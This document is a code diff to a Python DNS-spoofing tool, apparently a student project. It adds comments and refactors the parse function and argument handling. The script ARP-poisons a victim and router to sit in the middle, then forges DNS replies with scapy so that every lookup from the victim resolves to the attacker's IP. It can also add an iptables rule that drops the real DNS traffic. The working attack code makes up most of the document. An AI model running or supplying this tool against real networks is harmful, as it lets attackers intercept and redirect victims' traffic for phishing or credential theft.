@@ -15,7 +15,9 @@
 #-- PROGRAMMERS:    Brij Shah, Callum Styan
 #--
 #-- NOTES:
-#--
+#-- dnsSpoof utilizes arpSpoof to initiate a 'man-in-the-middle' attack then
+#-- proceeds to repsond to every DNS request from the victim with the
+#-- specified ip address from the config file.
 #-----------------------------------------------------------------------------
 
 import ConfigParser, os, platform, sys, signal, multiprocessing, logging, time, argparse, arpSpoof
@@ -32,7 +34,9 @@ variables = 0
 #-- VARIABLES(S):   section - the section in the config file
 #--
 #-- NOTES:
-#--
+#-- Reads the config file and seperates the hardware MAC address and IP 
+#-- address associated with it then returns it as a dictionary to be accessed
+#-- by arpSpoof and the sniff callback method.
 #-----------------------------------------------------------------------------
 def configSectionMap(section):
     dict = {}
@@ -55,7 +59,9 @@ def configSectionMap(section):
 #-- VARIABLES(S):   signal
 #--
 #-- NOTES:
-#--
+#-- signalHandler is invoked when the OS sends 'ctrl-C' to the application.
+#-- Once invoked, the default method is called and the application is
+#-- terminated and all processes are killed. 
 #-----------------------------------------------------------------------------
 def signalHandler(signal, frame):
     default()
@@ -65,7 +71,8 @@ def signalHandler(signal, frame):
 #-- FUNCTION:       forward()
 #--
 #-- NOTES:
-#--
+#-- forward checks the operating system type and invokes the specific IP
+#-- forwarding call to foward all packets.
 #-----------------------------------------------------------------------------
 def forward():
     if operatingSystem == 'Darwin':
@@ -77,7 +84,8 @@ def forward():
 #-- FUNCTION:       default()
 #--
 #-- NOTES:
-#--
+#-- default is called on exit. All IP forwarding rules and iptables rules are
+#-- reset to default.
 #-----------------------------------------------------------------------------
 def default():
     if operatingSystem == 'Darwin':
@@ -92,25 +100,29 @@ def default():
 #-- VARIABLES(S):   packet - the packets being sniffed
 #--
 #-- NOTES:
-#--
+#-- parse is the callback for the sniff filter. It receives all packets 
+#-- coming into system and parses through all DNS packets. If parse receives
+#-- a DNS query from the specified victim, it responds with a crafted DNS
+#-- response packet that will send it to the specified URL.
 #-----------------------------------------------------------------------------
 def parse(packet):
     global variables
-    if packet.haslayer(IP):
-        if packet[0][1].src == variables['victimip']:
-            if packet.haslayer(DNS):
-                if DNSQR in packet:
-                    packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
-                                  UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
-                                  DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
-                                  an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=variables['ourip'])))
-                    sendp(packetResponse, count=1, verbose=0)
+    try:
+        if packet.haslayer(DNSQR) and packet[IP].src == variables['victimip']:
+            packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
+                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+                          DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
+                          an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=variables['ourip'])))
+            sendp(packetResponse, count=1, verbose=0)
+    except IndexError:
+        pass
 
 #-----------------------------------------------------------------------------
 #-- FUNCTION:       firewallRule()
 #--
 #-- NOTES:
-#--
+#-- firewallRule created an iptables rule to drop forwarding of any packets
+#-- destined for destintion port 53.
 #-----------------------------------------------------------------------------
 def firewallRule():
 	firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
@@ -120,11 +132,20 @@ def firewallRule():
 #-- FUNCTION:       main()
 #--
 #-- NOTES:
-#--
+#-- The pseudomain method called by the main function.
 #-----------------------------------------------------------------------------
 def main():
     global variables
     forward()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-ip"
+                       ,"--iptablesRule"
+                       , help="use an iptables rule to drop all dns traffic on forward chain"
+                       ,action="store_true")
+    args = parser.parse_args()
+    if args.iptablesRule:
+        firewallRule()
+
     variables = configSectionMap('ARP')
     arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof
                                         , args = (variables['routerip']
@@ -141,14 +162,6 @@ def main():
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-ip"
-                       ,"--iptablesRule"
-                       , help="use an iptables rule to drop all dns traffic on forward chain"
-                       ,action="store_true")
-    args = parser.parse_args()
-    if args.iptablesRule:
-        firewallRule()
     try:
         main()
     except KeyboardInterrupt:
